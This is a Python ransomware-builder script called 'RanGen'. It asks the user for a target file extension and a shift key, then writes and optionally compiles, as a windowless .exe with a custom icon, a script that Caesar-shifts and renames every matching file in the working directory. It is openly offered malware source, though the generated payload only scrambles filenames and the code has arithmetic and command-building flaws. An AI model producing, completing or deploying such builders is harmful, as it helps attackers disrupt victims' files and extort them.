import os

os.system("cls")
CRED = '\033[91m'
CGREEN = '\u001b[32m'
CEND = '\033[0m'
CYELLOW = '\u001b[33m'
print(CGREEN+'''  ____                     ____                
 |  _ \    __ _   _ __    / ___|   ___   _ __  
 | |_) |  / _` | | '_ \  | |  _   / _ \ | '_ \ 
 |  _ <  | (_| | | | | | | |_| | |  __/ | | | |
 |_| \_\  \__,_| |_| |_|  \____|  \___| |_| |_|
                                               
  Created by N!gh+m@r3             version 1.0.0        '''+CEND)

alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890-=!@#$%^&*()_+{}[];:<>,.?/\|"

name_of_ransome = input(CGREEN+"[*] Please enter the name of your ransomware : "+CEND)
print('')
print(CYELLOW+'For Example : .txt '+CEND)
print('')
infect_ext = input(CGREEN+"[*] Enter the type of file extensions that you want to infect : "+CEND)
print('')
shift_main = input(CGREEN+"[*] Enter the number of key ( only integer )  : "+CEND)
print('')
print(CRED+"If there is an error , change the number of key and try again "+CEND)
print('')
print(CYELLOW+'For Example : .ENCRYPTED '+CEND)
print('')
ext_aft_infect = input(CGREEN+"[*] Enter the extension of infected files : "+CEND)
print('')


print(CRED + "Ransomware name : "+ name_of_ransome + "\n" +
      "Target extension : "+ infect_ext + "\n" +
      "Shift : "+ shift_main + "\n"
      "Infected files extenion : "+ ext_aft_infect + "\n" +CEND)


def main():
      print(CGREEN + "[+] Your Ransomware  is going to be Generated"+ CEND)
      with open(name_of_ransome+".py", "w+") as g:
            g.write("import os \n"
                    "os.system('cls')\n"
                    "alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890-=!@#$%^&()_+{}[];,.'\n"
                    "\n"
                    "\n"
                    "def fileexist(name):\n"
                    "\treturn os.path.exists(name)\n"
                    "\n"
                    "\n"
                    "def ransomware():\n"
                    "\tglobal i\n"
                    "\tcwd = os.getcwd()\n"
                    "\text = '"+ infect_ext + "'\n"
                    "\tglobal final_out\n"
                    "\tfinal_out =''\n"
                    "\toutput = ''\n"
                    "\tglobal infect_ext\n"
                    "\tinfect_ext ='" + ext_aft_infect + "'\n"
                    "\tfor i in os.listdir(cwd):\n"
                    "\t\tif i.endswith(ext):\n"
                    "\t\t\t#print(i)\n"
                    "\t\t\tfor x in range(len(i)):\n"
                    "\t\t\t\tchar = i[x]\n"
                    "\t\t\t\tchar_location = alpha.find(char)\n"
                    "\t\t\t\tchar_new_location = (char_location +"+shift_main+")%82;\n"
                    "\t\t\t\toutput += alpha[char_new_location]\n"
                    "\t\t\t\tif x >= len( i )-1:\n"
                    "\t\t\t\t\trename( output )\n"
                    "\t\t\t\t\t#print( i + ' is encrypted to ' + output )\n"
                    "\t\t\t\t\toutput = ''\n"
                    "\t\t\t\t\t#print( output )\n"
                    "\n"
                    "\n"
                    "\n"
                    "def rename(output):\n"
                    "\tos.rename( i, output + infect_ext )\n"
                    "\n"
                    "\n"
                    "\n"
                    "if __name__ == '__main__':\n"
                    "\transomware()\n")

            g.close()
      nextdef = input (CGREEN+'Press Any key to Continue : '+CEND)
      execonvert()

def execonvert():
        os.system('cls')
        print( CGREEN+'''  ____                     ____                
         |  _ \    __ _   _ __    / ___|   ___   _ __  
         | |_) |  / _` | | '_ \  | |  _   / _ \ | '_ \ 
         |  _ <  | (_| | | | | | | |_| | |  __/ | | | |
         |_| \_\  \__,_| |_| |_|  \____|  \___| |_| |_|
                                                       
         Created by N!gh+m@r3             version 1.0.0            '''+CEND )
        print('')
        print(CGREEN+'[+] Your Ransomware has been generated soon! \n'+CEND)
        print('')
        print(CRED+'EXE files may not work sometimes ! '+CEND)
        print(CRED+'You will need pyinstaller module to compile your ransomware into exe file '+CRED)
        choice = input(CGREEN+'[*] Choose your ransomware extension (.exe / .py ) : '+CEND)
        print('')
        if choice == ".exe":
                icon = input(CGREEN+"[*] Want to add an icon to your .exe ? (Y / N ) : "+CEND)
                if icon == "Y":
                        icon_location = input(CGREEN+"[*] Enter the path or location to your icon file (.ico) :"+CEND)
                        try:
                                os.system( 'pyinstaller -w -F -i '+ icon_location + '' + name_of_ransome + '.py')
                                print('')
                                print(CGREEN+'[+] Successfully compiled ! '+CEND)
                        except FileNotFoundError as e:
                                print(CRED+"[!] Error : " + e +CEND)
                elif icon == "N":
                        try:
                                os.system('pyinstaller -w -F '+ name_of_ransome + '.py')
                                print('')
                                print(CGREEN+'[+] Successfully Compiled ! '+CEND)
                        except:
                                print(CRED+'[!] Error : ' + CEND)
        if choice == ".py":
                try:
                        print(CGREEN+'[+] Successfully Generated ! '+CEND)
                        exit(1)
                except FileExistsError as e:
                        print(CRED+'[!] Error : '+ e +  CEND)
                        exit(1)

if __name__ == "__main__":
      main()


